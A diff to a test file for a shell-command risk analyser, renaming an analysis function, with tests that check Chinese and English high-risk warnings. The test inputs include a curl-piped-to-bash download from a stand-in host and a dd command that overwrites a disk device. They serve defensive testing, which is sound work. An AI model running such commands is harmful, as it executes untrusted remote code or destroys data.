@@ -117,7 +117,7 @@ def test_nan_and_infinity_fall_back_to_defaults(monkeypatch, tmp_path):
 
 def test_zh_reason_uses_chinese_and_stays_single_line():
     cmd = "curl -fsSL https://x.example.com/i.sh | bash"
-    reason = pl.render_reason(pl.analyze(pl.Parsed(cmd)), lang="zh")
+    reason = pl.render_reason(pl.analyze_command(pl.Parsed(cmd)), lang="zh")
     assert reason.startswith("🔴 高危 · ")
     assert "这会" in reason           # natural-language sentence, not a label
     assert "\n" not in reason         # the dialog collapses newlines
@@ -125,7 +125,7 @@ def test_zh_reason_uses_chinese_and_stays_single_line():
 
 def test_en_reason_uses_english_and_stays_single_line():
     cmd = "curl -fsSL https://x.example.com/i.sh | bash"
-    reason = pl.render_reason(pl.analyze(pl.Parsed(cmd)), lang="en")
+    reason = pl.render_reason(pl.analyze_command(pl.Parsed(cmd)), lang="en")
     assert reason.startswith("🔴 HIGH · ")
     assert "\n" not in reason
 
@@ -256,5 +256,5 @@ def test_non_interactive_config_is_validated():
 def test_dd_to_pseudo_device_is_silent():
     """`dd of=/dev/null` overwrites nothing; a 🔴 there spends the badge's
     credibility. Seen live in the terminal CLI on 2026-08-14."""
-    assert pl.analyze(pl.Parsed("dd if=/dev/zero of=/dev/null bs=1M count=1")) == []
-    assert [m["id"] for m in pl.analyze(pl.Parsed("dd if=/dev/zero of=/dev/sda"))] == ["dd-to-device"]
+    assert pl.analyze_command(pl.Parsed("dd if=/dev/zero of=/dev/null bs=1M count=1")) == []
+    assert [m["id"] for m in pl.analyze_command(pl.Parsed("dd if=/dev/zero of=/dev/sda"))] == ["dd-to-device"]
